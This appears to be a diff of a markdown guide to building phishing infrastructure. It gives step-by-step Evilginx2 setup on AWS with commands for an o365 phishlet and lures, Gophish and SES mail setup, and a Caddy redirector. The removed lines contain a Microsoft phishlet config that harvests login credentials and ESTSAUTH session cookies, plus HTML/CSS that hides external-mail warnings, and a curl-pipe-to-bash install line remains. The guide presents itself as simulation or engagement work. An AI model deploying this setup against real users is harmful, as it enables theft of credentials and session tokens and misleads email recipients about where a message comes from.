@@ -99,9 +99,9 @@ Setting up Evilginx2 on AWS involves creating an instance, configuring security 
 1. **SSH into the Instance:**
    - Open your terminal.
    - Use the SSH command provided in AWS to connect to your instance:
-     ```shell
+     `
      ssh -i path/to/your/key.pem ubuntu@your-instance-public-ip
-     ```
+     `
 ## Installing Evilginx2 on AWS: Configuration Steps
 
 Setting up Evilginx2 on AWS involves installing, configuring, and customizing the tool for phishing purposes. Here's a step-by-step guide on how to do it:
@@ -122,15 +122,15 @@ Setting up Evilginx2 on AWS involves installing, configuring, and customizing th
 
 4. **Modify /etc/hosts:**
    - Add the internal IP address and your domain to the `/etc/hosts` file:
-     ```
+     `
      [internal IP] yourdomain.com
-     ```
+     `
 
 5. **Stop Local DNS Server:**
    - Stop the local DNS server to avoid conflicts with Evilginx2:
-     ```
+     `
      sudo systemctl stop systemd-resolved.service
-     ```
+     `
 
 6. **Edit Blacklist:**
    - Open the `blacklist.txt` file located in `~/.evilginx/`.
@@ -143,18 +143,18 @@ Setting up Evilginx2 on AWS involves installing, configuring, and customizing th
 
 8. **Configure Evilginx2:**
    - Set the domain, external IP, and redirect URL:
-     ```
+     `
      : config domain yourdomain.com
      : config ip XX.XX.XX.XXX
      : config redirect_url https://url.for.the.redirect
-     ```
+     `
 
 9. **Configure Phishlets:**
    - Set up the o3652 phishlet to use the configured domain:
-     ```
+     `
      : phishlets hostname o365 yourdomain.com
      : phishlets enable o3652
-     ```
+     `
 
 10. **Blacklist Setup:**
     - Add blacklist rules to prevent scanning: `: blacklist unauth`
@@ -162,10 +162,10 @@ Setting up Evilginx2 on AWS involves installing, configuring, and customizing th
 11. **Create Lures:**
     - Create a lure using the command: `: lures create O3652`
     - Edit the lure's parameters, title, URL, image, and redirect URL as needed:
-      ```
+      `
       : lures edit 0 path /something/that/seems/legit
       : lures edit 0 redirect_url https://something.com
-      ```
+      `
 
 12. **Generate Lure URL:**
     - Generate the URL for your lure: `: lures get-url 0`
@@ -218,16 +218,16 @@ When you're done using Evilginx2, it's crucial to take precautions to prevent un
 
 1. **Hiding the Phishlet:**
    - After you've finished your testing or engagement, use the following command to hide the phishlet you created:
-     ```
+     `
      : phishlets hide phishlet_name
-     ```
+     `
    - This action will remove the phishlet from being accessible, reducing the risk of accidental or unauthorized access.
 
 2. **Enabling the Blacklist:**
    - If you temporarily disabled the blacklist for testing purposes, you should re-enable it to prevent scanning or unauthorized access:
-     ```
+     `
      : blacklist unauth
-     ```
+     `
 
 3. **Secure Credentials and Data:**
    - Ensure that any captured credentials or data are properly managed and securely stored. Do not leave sensitive information exposed or accessible.
@@ -238,35 +238,6 @@ When you're done using Evilginx2, it's crucial to take precautions to prevent un
 5. **Monitor for Suspicious Activity:**
    - Continuously monitor your environment for any signs of suspicious activity or unauthorized access, especially if you were running Evilginx2 on a live network.
 
-### Phishlet for Microsoft
-```yaml
-author: '@kike,@bsmithday,@JRodriguez556'
-min_ver: '2.3.0'
-proxy_hosts:
-- {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-- {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
-sub_filters:
-- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
-- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
-- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
-- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href=https://{hostname}', replace: 'href=https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-- {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-auth_tokens:
-- domain: '.login.microsoftonline.com'
-  keys: ['ESTSAUTH' , 'ESTSAUTHPERSISTENT' , 'SignInStateCookie']
-credentials:
-  username:
-    key: 'login'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'passwd'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'login.microsoftonline.com'
-  path: '/?auth=2'
-```
 ## Setting Up WorkMail and Amazon SES for Phishing
 
 To simulate phishing attacks, you need to set up Amazon WorkMail (for email services) and Amazon SES (Simple Email Service) on AWS. Here's a step-by-step guide on how to configure these services for phishing purposes:
@@ -330,9 +301,9 @@ To proceed with your phishing simulation, you can set up and run Sneaky Gophish.
 
 4. **Run the Docker Container:**
    - Start the Docker container and map the container's ports to your localhost's ports:
-     ```
+     `
      docker run -d --name gophish_hardened -p 127.0.0.1:6666:3333 -p 127.0.0.1:8888:80 gophish:hardened
-     ```
+     `
 
 5. **Verify Container and Images:**
    - Check the status of running Docker containers: `docker ps`
@@ -407,9 +378,9 @@ Here's an example of how you can set up a Caddy server to serve as a redirector 
 
    You can use Caddy's official website to get the installation script:
 
-   ```bash
+   `
    curl https://getcaddy.com | bash -s personal
-   ```
+   `
 
    This command will automatically download and install Caddy with the personal license.
 
@@ -417,19 +388,19 @@ Here's an example of how you can set up a Caddy server to serve as a redirector 
 
    Create a Caddy configuration file, typically named `Caddyfile`, in the directory where you have Caddy installed. You can use a text editor to create and edit this file.
 
-   ```plaintext
+   `
    sudo nano /etc/caddy/Caddyfile
-   ```
+   `
 
 3. **Add Your Redirector Configuration:**
 
    Add the following lines to your `Caddyfile`, adjusting the domain and IP address:
 
-   ```plaintext
+   `
    your-subdomain.your-domain.com {
        reverse_proxy http://evilnginx-server-ip
    }
-   ```
+   `
    
    Replace `your-subdomain.your-domain.com` with the custom subdomain to use for your phishing. This configuration will instruct Caddy to act as a reverse proxy, redirecting incoming requests to the `evilnginx-server-ip` where the fake login page is hosted.
 
@@ -441,48 +412,26 @@ Here's an example of how you can set up a Caddy server to serve as a redirector 
 
    Restart Caddy to apply the new configuration:
 
-   ```bash
+   `
    sudo systemctl restart caddy
-   ```
+   `
 
 6. **Check Caddy Status:**
 
    You can check the status of Caddy to make sure it's running without errors:
 
-   ```bash
+   `
    sudo systemctl status caddy
-   ```
+   `
 
    If everything is configured correctly, you should see that Caddy is active and running.
 
 Please note that this is a simplified example, and you may need to adapt it to your specific setup and requirements. 
 #### Creating Fake Alerts in Phishing Emails
 
-Administrators of Microsoft 365 often implement rules to flag emails from external sources, aiming to highlight potential phishing attempts. This practice helps users identify potentially risky emails. An example of the HTML code for a typical alert is shown below:
+Administrators of Microsoft 365 often implement rules to flag emails from external sources, aiming to highlight potential phishing attempts. This practice helps users identify potentially risky emails. 
 
-```html
-<p style="border:1px; border-style:solid; border-color:#FFCACA; background-color:#FFCACA; padding: 0.5em;">
-  <span style="font-size:12.0pt;color:black;"><b>External Mail:</b></span>
-  <span style="font-size:12.0pt;color:black;">The email comes from outside of your organization, be carefull on attachments and links.</span>
-</p>
-```
-
-For instance, we can strategically use a negative margin to position our desired alert on top of the injected alert, effectively covering it up.
-
-However, we can go a step further and completely remove the injected alert using the following HTML and CSS code:
-
-```html
-<style>
-  p {
-    display: none !important;
-  }
-</style>
-<h2>The email has been verified</h2>
-<p style="display: block !important;">
-</p>
-```
-
-By applying this code, the injected alert will be hidden, giving the appearance that the email originated from an internal source without any alerts or warnings.
+For instance, we can strategically use a negative margin to position our desired alert on top of the injected alert, effectively covering it up, giving the appearance that the email originated from an internal source without any alerts or warnings.
 
 This manipulation showcases the challenge of relying solely on visual indicators to determine the legitimacy of an email. It's a reminder that attackers can skillfully manipulate elements to deceive recipients and make phishing emails appear more convincing. As a result, user education, vigilant security practices, and multi-layered security solutions are crucial to mitigating the risks posed by such tactics.
 
